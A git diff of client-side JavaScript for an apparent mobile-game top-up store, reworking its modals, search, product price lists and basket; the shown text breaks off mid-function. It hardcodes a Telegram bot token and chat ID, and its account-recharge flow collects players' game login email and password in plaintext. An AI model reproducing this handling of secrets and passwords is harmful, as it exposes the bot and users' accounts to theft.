@@ -11,8 +11,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 introOverlayNode.remove();
                 document.body.style.overflow = "auto";
                 document.body.style.overflowX = "hidden";
-                
-                // تهيئة القائمة العلوية والتوجيه الافتراضي للـ Home
                 syncInitialNavbarLayout();
                 routeTabView("#home");
             }, 800); 
@@ -20,219 +18,75 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ==========================================
-    // CONFIG TELEGRAM INTEGRATION SETUP
+    // TELEGRAM CONFIG
     // ==========================================
     const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
     const TELEGRAM_CHAT_ID = "8851363543"; 
 
-    // View Pages
+    // ==========================================
+    // DOM REFERENCES
+    // ==========================================
     const storePage = document.getElementById('store-page');
 
-    // Modals Elements
-    const gameModal = document.getElementById('game-modal');
-    const rechargeModal = document.getElementById('recharge-modal');
-    const checkoutModal = document.getElementById('checkout-modal');
+    // Modals
+    const ffTypeModal      = document.getElementById('ff-type-modal');
+    const rechargeModal    = document.getElementById('recharge-modal');
+    const credentialsModal = document.getElementById('credentials-modal');
+    const checkoutModal    = document.getElementById('checkout-modal');
+
+    // FF Type selection buttons
+    const ffChooseId  = document.getElementById('ff-choose-id');
+    const ffChooseAcc = document.getElementById('ff-choose-acc');
+    const closeFFType = document.getElementById('close-ff-type');
+
+    // Recharge / product list
     const rechargeList = document.querySelector('.recharge-list');
-    const modalTitle = document.getElementById('modal-game-title');
-    const modalIcon = document.getElementById('modal-game-icon');
-    const toggleContainer = document.getElementById('modal-toggle-container');
-    const btnId = document.getElementById('btn-id');
-    const btnAcc = document.getElementById('btn-acc');
+    const backToId     = document.getElementById('back-to-id');
+    const openBasketFromProducts = document.getElementById('open-basket-from-products');
 
-    // Inputs Controls Configuration
-    const idGroup = document.getElementById('id-input-group');
-    const accGroup = document.getElementById('acc-input-group');
-    const idField = document.getElementById('game-id-field');
-    const emailField = document.getElementById('acc-email-field');
-    const passField = document.getElementById('acc-pass-field');
-    const confirmBtn = document.getElementById('confirm-btn');
-    
-    const checkoutActionContainer = document.getElementById('checkout-action-container');
-    const successNotification = document.getElementById('success-notification');
+    // Credentials modal elements
+    const credModalTitle   = document.getElementById('cred-modal-title');
+    const credModalIcon    = document.getElementById('cred-modal-icon');
+    const idCredSection    = document.getElementById('id-credentials-section');
+    const accCredSection   = document.getElementById('acc-credentials-section');
+    const idInputSectionBox  = document.getElementById('id-input-section-box');
+    const accInputSectionBox = document.getElementById('acc-input-section-box');
+    const idField          = document.getElementById('game-id-field');
+    const emailField       = document.getElementById('acc-email-field');
+    const passField        = document.getElementById('acc-pass-field');
+    const confirmIdBtn     = document.getElementById('confirm-id-btn');
+    const confirmAccBtn    = document.getElementById('confirm-acc-btn');
+    const backFromCreds    = document.getElementById('back-from-credentials');
 
-    // Interactive State Variables
-    let currentGame = ""; 
-    let currentMethod = "ID"; 
+    // Checkout
+    const backToRecharge       = document.getElementById('back-to-recharge');
+    const checkoutActionCont   = document.getElementById('checkout-action-container');
+    const successNotification  = document.getElementById('success-notification');
+    const floatingBasketTrigger = document.getElementById('floating-basket-trigger');
 
-    // Global Shopping Cart Engine Core Array State
+    // ==========================================
+    // STATE
+    // ==========================================
+    let currentGame   = "";
+    let currentMethod = "ID"; // "ID" or "ACC"
     let shoppingBasket = [];
     let authenticatedUserMeta = { method: "", rawId: "", email: "", password: "" };
 
-    // Floating UI Synchronizer Hooks
-    const floatingBasketTrigger = document.getElementById('floating-basket-trigger');
-    const openBasketFromProducts = document.getElementById('open-basket-from-products');
-
+    // ==========================================
+    // THEMES
+    // ==========================================
     const themes = {
-        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png/revision/latest/smart/width/250/height/250?cb=20240517153409" },
-        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
-        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
+        "FREE FIRE":   { color: "#ff6600", accent: "#ff8a00", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png/revision/latest/smart/width/250/height/250?cb=20240517153409" },
+        "PUBG":        { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
+        "CALL OF DUTY":{ color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
         "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
-        "PES MOBILE": { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
-        "BLOOD STRIKE": { color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
+        "PES MOBILE":  { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
+        "BLOOD STRIKE":{ color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
     };
 
-    // --- Dynamic Link Mouse Positions Tracking Logic ---
-    function inverseMousePosition(element, event) {
-        const rect = element.getBoundingClientRect();
-        const x = event.clientX - rect.left;
-        const y = event.clientY - rect.top;
-        return {
-            x1: -(x - rect.width / 2) / 20,
-            y1: -(y - rect.height / 2) / 20
-        };
-    }
-
-    function handleTabClick(event) {
-        const navNode = document.querySelector('.nav');
-        const targetLi = event.target.closest('li');
-        if (!targetLi) return;
-
-        const width = targetLi.offsetWidth;
-        const left = targetLi.getBoundingClientRect().left;
-        const offsetLeft = left - navNode.getBoundingClientRect().left;
-
-        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
-        targetLi.classList.add('active');
-
-        navNode.style.setProperty('--after-bg-position', offsetLeft);
-        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
-        navNode.style.setProperty('--after-bg-width', width);
-
-        const targetHash = event.target.getAttribute('href');
-        routeTabView(targetHash);
-    }
-
-    const premiumNav = document.querySelector('.nav');
-    if (premiumNav) {
-        const navLinks = premiumNav.querySelectorAll('li a');
-        for (let i = 0; i < navLinks.length; i++) {
-            navLinks[i].addEventListener('click', (e) => {
-                e.preventDefault();
-                handleTabClick(e);
-            });
-            navLinks[i].addEventListener("mousemove", (event) => {
-                const tilt = inverseMousePosition(event.target, event);
-                premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
-                premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
-            });
-        }
-    }
-
-    function syncInitialNavbarLayout() {
-        if (!storePage || !storePage.classList.contains('active')) return;
-        if (!premiumNav) return;
-        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
-        if (!activeLi) return;
-        
-        const width = activeLi.offsetWidth;
-        const left = activeLi.getBoundingClientRect().left;
-        const offsetLeft = left - premiumNav.getBoundingClientRect().left;
-
-        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
-        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
-        premiumNav.style.setProperty('--after-bg-width', width);
-    }
-
-    window.addEventListener('resize', syncInitialNavbarLayout);
-
-    function routeTabView(hashTarget) {
-        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
-        
-        if (hashTarget === "#home" || hashTarget === "") {
-            const homeSec = document.getElementById('home-content-section');
-            if (homeSec) homeSec.classList.add('active-view');
-        } else if (hashTarget === "#search") {
-            const searchSec = document.getElementById('search-content-section');
-            if (searchSec) searchSec.classList.add('active-view');
-            const searchInp = document.getElementById('store-search-input');
-            if (searchInp) searchInp.value = "";
-            processLiveSearchFilter("");
-        } else if (hashTarget === "#about") {
-            const aboutSec = document.getElementById('about-content-section');
-            if (aboutSec) aboutSec.classList.add('active-view');
-        } else if (hashTarget === "#support") {
-            const supportSec = document.getElementById('support-content-section');
-            if (supportSec) supportSec.classList.add('active-view');
-        }
-    }
-
-    // --- Live Filtering Search Algorithm ---
-    const searchInput = document.getElementById('store-search-input');
-    const searchResultsViewport = document.getElementById('search-results-viewport');
-
-    if (searchInput) {
-        searchInput.addEventListener('input', (e) => {
-            processLiveSearchFilter(e.target.value);
-        });
-    }
-
-    function processLiveSearchFilter(queryText) {
-        if (!searchResultsViewport) return;
-        const cleanedQuery = queryText.trim().toLowerCase();
-        searchResultsViewport.innerHTML = "";
-
-        if (cleanedQuery === "") {
-            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
-            return;
-        }
-
-        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
-        let matchesCount = 0;
-
-        sourceCards.forEach(card => {
-            const indexName = card.getAttribute('data-game-search-title') || "";
-            if (indexName.includes(cleanedQuery)) {
-                matchesCount++;
-                const clonedCard = card.cloneNode(true);
-                
-                clonedCard.addEventListener('click', () => {
-                    if (indexName.includes("free fire")) currentGame = "FREE FIRE";
-                    if (indexName.includes("pubg")) currentGame = "PUBG";
-                    if (indexName.includes("call of duty")) currentGame = "CALL OF DUTY";
-                    if (indexName.includes("fifa")) currentGame = "FIFA MOBILE";
-                    if (indexName.includes("pes")) currentGame = "PES MOBILE";
-                    if (indexName.includes("blood strike")) currentGame = "BLOOD STRIKE";
-                    
-                    openCredentialsModal();
-                });
-
-                searchResultsViewport.appendChild(clonedCard);
-            }
-        });
-
-        if (matchesCount === 0) {
-            searchResultsViewport.innerHTML = `<div class="not-found-feedback">sorry, this game is not found</div>`;
-        }
-    }
-
     // ==========================================
-    // INTERACTIVE APPLICATION MATRIX MODALS
+    // PRODUCTS DATA
     // ==========================================
-    const closeModalBtn = document.getElementById('close-modal');
-    if (closeModalBtn) {
-        closeModalBtn.addEventListener('click', () => {
-            if (gameModal) gameModal.classList.remove('active');
-        });
-    }
-    
-    const backToIdBtn = document.getElementById('back-to-id');
-    if (backToIdBtn) {
-        backToIdBtn.addEventListener('click', () => {
-            if (rechargeModal) rechargeModal.classList.remove('active');
-            openCredentialsModal();
-        });
-    }
-    
-    const backToRechargeBtn = document.getElementById('back-to-recharge');
-    if (backToRechargeBtn) {
-        backToRechargeBtn.addEventListener('click', () => {
-            if (checkoutModal) checkoutModal.classList.remove('active');
-            if (rechargeModal) rechargeModal.classList.add('active');
-            initializeProductSelection(currentGame);
-        });
-    }
-
-    // Products Datasets
     const ffIdProducts = `
         <div class="recharge-item" data-id="ff_id_100" data-name="◇ 100 Diamond" data-price="55"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
         <div class="recharge-item" data-id="ff_id_210" data-name="◇ 210 Diamond" data-price="105"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
@@ -240,27 +94,17 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item" data-id="ff_id_420" data-name="◇ 420 Diamond" data-price="205"><span class="item-name">◇ 420 Diamond</span><span class="item-price">205 EGP</span></div>
         <div class="recharge-item" data-id="ff_id_520" data-name="◇ 520 Diamond" data-price="255"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
         <div class="recharge-item membership" data-id="ff_id_w_mem" data-name="★ Weekly Membership" data-price="110"><span class="item-name">★ Weekly Membership</span><span class="item-price">105 EGP</span></div>
-        <div class="recharge-item membership" data-id="ff_id_m_mem" data-name="★ Monthly Membership" data-price="540"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>     
+        <div class="recharge-item membership" data-id="ff_id_m_mem" data-name="★ Monthly Membership" data-price="540"><span class="item-name">★ Monthly Membership</span><span class="item-price">520 EGP</span></div>
         <hr class="about-divider">
-        <h3 class="selection-title">another sales 🔔</h3>
-        <div class="recharge-item" data-id="ff_id_750" data-name="◇ 750 Diamond[اسبوعي +300]" data-price="265"><span class="item-name">◇ 750 Diamond[اسبوعي +300]</span><span class="item-price">265 EGP</span></div>
-        <div class="recharge-item" data-id="ff_id_1050" data-name="◇ 1050 Diamond[اسبوعي +600]" data-price="420"><span class="item-name">◇ 1050 Diamond[اسبوعي +600]</span><span class="item-price">420 EGP</span></div>
-        <div class="recharge-item" data-id="ff_id_1450" data-name="◇ 1450 Diamond[اسبوعي +1000]" data-price="660"><span class="item-name">◇ 1450 Diamond[اسبوعي +1000]</span><span class="item-price">660 EGP</span></div>
+        <h3 class="selection-title" style="font-size:1rem; margin:10px 0 5px;">another sales 🔔</h3>
+        <div class="recharge-item" data-id="ff_id_750" data-name="◇ 750 Diamond [اسبوعي +300]" data-price="265"><span class="item-name">◇ 750 Diamond [اسبوعي +300]</span><span class="item-price">265 EGP</span></div>
+        <div class="recharge-item" data-id="ff_id_1050" data-name="◇ 1050 Diamond [اسبوعي +600]" data-price="420"><span class="item-name">◇ 1050 Diamond [اسبوعي +600]</span><span class="item-price">420 EGP</span></div>
+        <div class="recharge-item" data-id="ff_id_1450" data-name="◇ 1450 Diamond [اسبوعي +1000]" data-price="660"><span class="item-name">◇ 1450 Diamond [اسبوعي +1000]</span><span class="item-price">660 EGP</span></div>
     `;
 
     const ffAccProducts = `
-        <div class="recharge-item" data-id="ff_acc_100" data-name="◇ 100 Diamond Bonus" data-price="50"><span class="item-name">◇ 100 Diamond Bonus</span><span class="item-price">45 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_210" data-name="◇ 210 Diamond" data-price="95"><span class="item-name">◇ 210 Diamond</span><span class="item-price">90 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_310" data-name="◇ 310 Diamond" data-price="140"><span class="item-name">◇ 310 Diamond</span><span class="item-price">140 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_400" data-name="◇ 420 Diamond" data-price="180"><span class="item-name">◇ 400 Diamond</span><span class="item-price">185 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_500" data-name="◇ 520 Diamond" data-price="225"><span class="item-name">◇ 500 Diamond</span><span class="item-price">230 EGP</span></div>
         <div class="recharge-item membership" data-id="ff_acc_w_mem" data-name="★ Weekly Membership" data-price="85"><span class="item-name">★ Weekly Membership</span><span class="item-price">85 EGP</span></div>
         <div class="recharge-item membership" data-id="ff_acc_m_mem" data-name="★ Monthly Membership" data-price="430"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
-        <hr class="about-divider">
-        <h3 class="selection-title">another sales 🔔</h3>
-        <div class="recharge-item" data-id="ff_acc_750" data-name="◇ 750 Diamond[اسبوعي +300]" data-price="220"><span class="item-name">◇ 750 Diamond[اسبوعي +300]</span><span class="item-price">220 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_1050" data-name="◇ 1050 Diamond[اسبوعي +600]" data-price="330"><span class="item-name">◇ 1050 Diamond[اسبوعي +600]</span><span class="item-price">330 EGP</span></div>
-        <div class="recharge-item" data-id="ff_acc_1450" data-name="◇ 1450 Diamond[اسبوعي +1000]" data-price="430"><span class="item-name">◇ 1450 Diamond[اسبوعي +1000]</span><span class="item-price">430 EGP</span></div>
     `;
 
     const pubgProducts = `
@@ -295,7 +139,7 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item" data-id="pes_578" data-name="◇ 578 Coins" data-price="265"><span class="item-name">◇ 578 Coins</span><span class="item-price">265 EGP</span></div>
         <div class="recharge-item" data-id="pes_788" data-name="◇ 788 Coins" data-price="355"><span class="item-name">◇ 788 Coins</span><span class="item-price">355 EGP</span></div>
         <div class="recharge-item" data-id="pes_1092" data-name="◇ 1092 Coins" data-price="485"><span class="item-name">◇ 1092 Coins</span><span class="item-price">485 EGP</span></div>
-        <div class="recharge-item membership" data-id="pes_hero" data-name="★ heroic Pass" data-price="260"><span class="item-name">★ heroic Pass </span><span class="item-price">260 EGP</span></div>
+        <div class="recharge-item membership" data-id="pes_hero" data-name="★ heroic Pass" data-price="260"><span class="item-name">★ heroic Pass</span><span class="item-price">260 EGP</span></div>
     `;
 
     const bsProducts = `
@@ -306,32 +150,361 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item" data-id="bs_1100" data-name="◇ 1100 Gold" data-price="495"><span class="item-name">◇ 1100 Gold</span><span class="item-price">495 EGP</span></div>
     `;
 
+    // ==========================================
+    // NAV / ROUTING
+    // ==========================================
+    function inverseMousePosition(element, event) {
+        const rect = element.getBoundingClientRect();
+        const x = event.clientX - rect.left;
+        const y = event.clientY - rect.top;
+        return {
+            x1: -(x - rect.width / 2) / 20,
+            y1: -(y - rect.height / 2) / 20
+        };
+    }
+
+    function handleTabClick(event) {
+        const navNode = document.querySelector('.nav');
+        const targetLi = event.target.closest('li');
+        if (!targetLi) return;
+        const width = targetLi.offsetWidth;
+        const left = targetLi.getBoundingClientRect().left;
+        const offsetLeft = left - navNode.getBoundingClientRect().left;
+        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
+        targetLi.classList.add('active');
+        navNode.style.setProperty('--after-bg-position', offsetLeft);
+        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
+        navNode.style.setProperty('--after-bg-width', width);
+        const targetHash = event.target.getAttribute('href');
+        routeTabView(targetHash);
+    }
+
+    const premiumNav = document.querySelector('.nav');
+    if (premiumNav) {
+        const navLinks = premiumNav.querySelectorAll('li a');
+        for (let i = 0; i < navLinks.length; i++) {
+            navLinks[i].addEventListener('click', (e) => { e.preventDefault(); handleTabClick(e); });
+            navLinks[i].addEventListener("mousemove", (event) => {
+                const tilt = inverseMousePosition(event.target, event);
+                premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
+                premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
+            });
+        }
+    }
+
+    function syncInitialNavbarLayout() {
+        if (!storePage || !storePage.classList.contains('active')) return;
+        if (!premiumNav) return;
+        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
+        if (!activeLi) return;
+        const width = activeLi.offsetWidth;
+        const left = activeLi.getBoundingClientRect().left;
+        const offsetLeft = left - premiumNav.getBoundingClientRect().left;
+        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
+        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
+        premiumNav.style.setProperty('--after-bg-width', width);
+    }
+    window.addEventListener('resize', syncInitialNavbarLayout);
+
+    function routeTabView(hashTarget) {
+        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
+        if (hashTarget === "#home" || hashTarget === "") {
+            const homeSec = document.getElementById('home-content-section');
+            if (homeSec) homeSec.classList.add('active-view');
+        } else if (hashTarget === "#search") {
+            const searchSec = document.getElementById('search-content-section');
+            if (searchSec) searchSec.classList.add('active-view');
+            const searchInp = document.getElementById('store-search-input');
+            if (searchInp) searchInp.value = "";
+            processLiveSearchFilter("");
+        } else if (hashTarget === "#about") {
+            const aboutSec = document.getElementById('about-content-section');
+            if (aboutSec) aboutSec.classList.add('active-view');
+        } else if (hashTarget === "#support") {
+            const supportSec = document.getElementById('support-content-section');
+            if (supportSec) supportSec.classList.add('active-view');
+        }
+    }
+
+    // ==========================================
+    // SEARCH
+    // ==========================================
+    const searchInput = document.getElementById('store-search-input');
+    const searchResultsViewport = document.getElementById('search-results-viewport');
+
+    if (searchInput) {
+        searchInput.addEventListener('input', (e) => { processLiveSearchFilter(e.target.value); });
+    }
+
+    function processLiveSearchFilter(queryText) {
+        if (!searchResultsViewport) return;
+        const cleanedQuery = queryText.trim().toLowerCase();
+        searchResultsViewport.innerHTML = "";
+        if (cleanedQuery === "") {
+            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
+            return;
+        }
+        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
+        let matchesCount = 0;
+        sourceCards.forEach(card => {
+            const indexName = card.getAttribute('data-game-search-title') || "";
+            if (indexName.includes(cleanedQuery)) {
+                matchesCount++;
+                const clonedCard = card.cloneNode(true);
+                clonedCard.addEventListener('click', () => {
+                    if (indexName.includes("free fire"))   { currentGame = "FREE FIRE";    openFFTypeModal(); }
+                    else if (indexName.includes("pubg"))   { currentGame = "PUBG";          openProductsDirectly(); }
+                    else if (indexName.includes("call of duty")) { currentGame = "CALL OF DUTY"; openProductsDirectly(); }
+                    else if (indexName.includes("fifa"))   { currentGame = "FIFA MOBILE";  openProductsDirectly(); }
+                    else if (indexName.includes("pes"))    { currentGame = "PES MOBILE";   openProductsDirectly(); }
+                    else if (indexName.includes("blood strike")) { currentGame = "BLOOD STRIKE"; openProductsDirectly(); }
+                });
+                searchResultsViewport.appendChild(clonedCard);
+            }
+        });
+        if (matchesCount === 0) {
+            searchResultsViewport.innerHTML = `<div class="not-found-feedback">No Games Found for "${queryText}"</div>`;
+        }
+    }
+
+    // ==========================================
+    // FLOW: FREE FIRE (3 steps)
+    // Step 1: FF Type Modal (ID or ACC)
+    // Step 2: Products
+    // Step 3: Credentials
+    // ==========================================
+
+    function openFFTypeModal() {
+        if (ffTypeModal) ffTypeModal.classList.add('active');
+    }
+
+    if (closeFFType) {
+        closeFFType.addEventListener('click', () => {
+            if (ffTypeModal) ffTypeModal.classList.remove('active');
+            resetBasket();
+        });
+    }
+
+    // User chose ID recharge for FF
+    if (ffChooseId) {
+        ffChooseId.addEventListener('click', () => {
+            currentMethod = "ID";
+            if (ffTypeModal) ffTypeModal.classList.remove('active');
+            // Show ID products
+            openProductsForFF("ID");
+        });
+    }
+
+    // User chose Account login for FF
+    if (ffChooseAcc) {
+        ffChooseAcc.addEventListener('click', () => {
+            currentMethod = "ACC";
+            if (ffTypeModal) ffTypeModal.classList.remove('active');
+            // Show Account products
+            openProductsForFF("ACC");
+        });
+    }
+
+    function openProductsForFF(method) {
+        if (!rechargeList) return;
+        if (method === "ID") {
+            rechargeList.innerHTML = ffIdProducts;
+        } else {
+            rechargeList.innerHTML = ffAccProducts;
+        }
+        applyThemeColors();
+        if (rechargeModal) rechargeModal.classList.add('active');
+        injectReactiveQuantitySelectors();
+    }
+
+    // ==========================================
+    // FLOW: OTHER GAMES (2 steps)
+    // Step 1: Products
+    // Step 2: Credentials (ID only for non-FF)
+    // ==========================================
+
+    function openProductsDirectly() {
+        currentMethod = "ID"; // non-FF games use ID
+        if (!rechargeList) return;
+        if (currentGame === "PUBG")         rechargeList.innerHTML = pubgProducts;
+        else if (currentGame === "CALL OF DUTY") rechargeList.innerHTML = codProducts;
+        else if (currentGame === "FIFA MOBILE")  rechargeList.innerHTML = fifaProducts;
+        else if (currentGame === "PES MOBILE")   rechargeList.innerHTML = pesProducts;
+        else if (currentGame === "BLOOD STRIKE") rechargeList.innerHTML = bsProducts;
+        applyThemeColors();
+        if (rechargeModal) rechargeModal.classList.add('active');
+        injectReactiveQuantitySelectors();
+    }
+
+    function applyThemeColors() {
+        if (!themes[currentGame]) return;
+        const color = themes[currentGame].color;
+        setTimeout(() => {
+            if (rechargeList) {
+                rechargeList.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
+                    el.style.borderColor = color;
+                });
+            }
+        }, 10);
+    }
+
+    // ==========================================
+    // BACK BUTTON from Products → correct modal
+    // ==========================================
+    if (backToId) {
+        backToId.addEventListener('click', () => {
+            if (rechargeModal) rechargeModal.classList.remove('active');
+            if (currentGame === "FREE FIRE") {
+                // Go back to FF type selection — basket keeps items until user fully exits
+                openFFTypeModal();
+            } else {
+                // Non-FF games: going back = full exit, reset basket
+                resetBasket();
+            }
+        });
+    }
+
+    // ==========================================
+    // PRODUCT SELECTED → Open Credentials Modal
+    // (triggered after choosing products via basket confirm)
+    // Actually: credentials asked AFTER selecting products
+    // The confirm button in credentials finalises the order
+    // ==========================================
+
+    function openCredentialsModal() {
+        if (!credentialsModal || !themes[currentGame]) return;
+        const theme = themes[currentGame];
+
+        if (credModalTitle) { credModalTitle.innerText = currentGame; credModalTitle.style.color = theme.color; }
+        if (credModalIcon) { credModalIcon.src = theme.icon; credModalIcon.style.borderColor = theme.color; }
+
+        if (currentMethod === "ID") {
+            if (idCredSection)  idCredSection.style.display  = "block";
+            if (accCredSection) accCredSection.style.display = "none";
+            if (idInputSectionBox)  idInputSectionBox.style.borderColor  = theme.color;
+            // Reset field
+            if (idField) idField.value = "";
+            validateIdInput();
+        } else {
+            if (idCredSection)  idCredSection.style.display  = "none";
+            if (accCredSection) accCredSection.style.display = "block";
+            if (accInputSectionBox) accInputSectionBox.style.borderColor = theme.color;
+            // Reset fields
+            if (emailField) emailField.value = "";
+            if (passField)  passField.value  = "";
+            validateAccInput();
+        }
+
+        // Style confirm buttons with theme
+        if (confirmIdBtn && themes[currentGame]) {
+            confirmIdBtn.style.background = `linear-gradient(to bottom, ${theme.color}, ${theme.accent})`;
+        }
+        if (confirmAccBtn && themes[currentGame]) {
+            confirmAccBtn.style.background = `linear-gradient(to bottom, ${theme.color}, ${theme.accent})`;
+        }
+
+        if (rechargeModal)    rechargeModal.classList.remove('active');
+        credentialsModal.classList.add('active');
+    }
+
+    // ==========================================
+    // BACK FROM CREDENTIALS → Products
+    // ==========================================
+    if (backFromCreds) {
+        backFromCreds.addEventListener('click', () => {
+            if (credentialsModal) credentialsModal.classList.remove('active');
+            if (rechargeModal)    rechargeModal.classList.add('active');
+        });
+    }
+
+    // ==========================================
+    // INPUT VALIDATION
+    // ==========================================
+    function validateIdInput() {
+        if (!confirmIdBtn) return;
+        const valid = idField && idField.value.trim().length > 4;
+        confirmIdBtn.disabled = !valid;
+        confirmIdBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
+        confirmIdBtn.style.opacity = valid ? '1' : '0.5';
+    }
+
+    function validateAccInput() {
+        if (!confirmAccBtn) return;
+        const emailValid = emailField && emailField.value.trim().length > 4;
+        const passValid  = passField  && passField.value.trim().length  > 2;
+        const valid = emailValid && passValid;
+        confirmAccBtn.disabled = !valid;
+        confirmAccBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
+        confirmAccBtn.style.opacity = valid ? '1' : '0.5';
+    }
+
+    if (idField)    idField.addEventListener('input', validateIdInput);
+    if (emailField) emailField.addEventListener('input', validateAccInput);
+    if (passField)  passField.addEventListener('input', validateAccInput);
+
+    // ==========================================
+    // CONFIRM ID → proceed to checkout
+    // ==========================================
+    if (confirmIdBtn) {
+        confirmIdBtn.addEventListener('click', () => {
+            authenticatedUserMeta.method   = "ID";
+            authenticatedUserMeta.rawId    = idField ? idField.value.trim() : "";
+            authenticatedUserMeta.email    = "";
+            authenticatedUserMeta.password = "";
+            if (credentialsModal) credentialsModal.classList.remove('active');
+            compileAndOpenCheckoutModal();
+        });
+    }
+
+    // ==========================================
+    // CONFIRM ACC → proceed to checkout
+    // ==========================================
+    if (confirmAccBtn) {
+        confirmAccBtn.addEventListener('click', () => {
+            authenticatedUserMeta.method   = "ACC";
+            authenticatedUserMeta.rawId    = "";
+            authenticatedUserMeta.email    = emailField ? emailField.value.trim() : "";
+            authenticatedUserMeta.password = passField  ? passField.value.trim()  : "";
+            if (credentialsModal) credentialsModal.classList.remove('active');
+            compileAndOpenCheckoutModal();
+        });
+    }
+
+    // ==========================================
+    // BASKET / CART
+    // ==========================================
     function updateBasketDOMCounters() {
         const totalItemsCount = shoppingBasket.reduce((acc, curr) => acc + curr.quantity, 0);
-        
         document.querySelectorAll('.basket-badge-count, #open-basket-from-products span').forEach(el => {
             el.innerText = totalItemsCount;
         });
-
         if (floatingBasketTrigger) {
-            if (totalItemsCount > 0) {
-                floatingBasketTrigger.style.display = 'flex';
-            } else {
-                floatingBasketTrigger.style.display = 'none';
-            }
+            floatingBasketTrigger.style.display = totalItemsCount > 0 ? 'flex' : 'none';
+        }
+    }
+
+    // ==========================================
+    // RESET BASKET — called on any full exit
+    // ==========================================
+    function resetBasket() {
+        shoppingBasket = [];
+        authenticatedUserMeta = { method: "", rawId: "", email: "", password: "" };
+        updateBasketDOMCounters();
+        // Also reset quantity selectors in the product list
+        if (rechargeList) {
+            rechargeList.querySelectorAll('.qty-current-val').forEach(el => { el.innerText = '0'; });
         }
     }
 
     function injectReactiveQuantitySelectors() {
         if (!rechargeList) return;
         rechargeList.querySelectorAll('.recharge-item').forEach(itemNode => {
-            const pId = itemNode.getAttribute('data-id');
-            const pName = itemNode.getAttribute('data-name');
+            const pId    = itemNode.getAttribute('data-id');
+            const pName  = itemNode.getAttribute('data-name');
             const pPrice = parseFloat(itemNode.getAttribute('data-price'));
-
             if (!pId) return;
 
-            const activeCartItem = shoppingBasket.find(i => i.id === pId);
+            const activeCartItem  = shoppingBasket.find(i => i.id === pId);
             const currentQuantity = activeCartItem ? activeCartItem.quantity : 0;
 
             let qtyContainer = itemNode.querySelector('.product-quantity-selector');
@@ -341,226 +514,60 @@ document.addEventListener('DOMContentLoaded', () => {
                 qtyContainer.addEventListener('click', (e) => e.stopPropagation());
                 itemNode.appendChild(qtyContainer);
             }
-
             qtyContainer.innerHTML = `
                 <button class="qty-mod-btn decrement-val">-</button>
                 <span class="qty-current-val">${currentQuantity}</span>
                 <button class="qty-mod-btn increment-val">+</button>
             `;
-
